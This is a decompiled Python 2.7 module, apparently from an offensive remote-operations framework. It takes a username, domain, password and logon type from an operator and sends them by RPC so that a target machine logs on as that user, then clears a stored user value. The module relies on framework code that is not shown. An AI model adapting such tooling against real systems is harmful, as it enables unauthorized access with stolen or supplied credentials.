# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_LogonAsUser_Tasking.py


def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.env
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.security.cmd.logonasuser', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.security.cmd.logonasuser.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    if lpParams['user'] == None or len(lpParams['user']) == 0 or lpParams['password'] == None:
        mcl.tasking.OutputError('Both user and password must be specified')
        return False
    else:
        tgtParams = mca.security.cmd.logonasuser.Params()
        tgtParams.user = lpParams['user']
        tgtParams.domain = lpParams['domain']
        tgtParams.password = lpParams['password']
        tgtParams.loginType = lpParams['type']
        rpc = mca.security.cmd.logonasuser.tasking.RPC_INFO_LOGIN
        msg = MarshalMessage()
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
        rpc.SetMessagingType('message')
        res = mcl.tasking.RpcPerformCall(rpc)
        if res != mcl.target.CALL_SUCCEEDED:
            mcl.tasking.RecordModuleError(res, 0, mca.security.cmd.logonasuser.errorStrings)
            return False
        import time
        while not mcl.CheckForStop():
            time.sleep(1)

        try:
            mcl.tasking.env.DeleteValue('_USER_%s' % tgtParams.user, globalValue=True)
        except:
            pass

        return mcl.tasking.TaskSetStatus(mcl.target.CALL_SUCCEEDED)


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)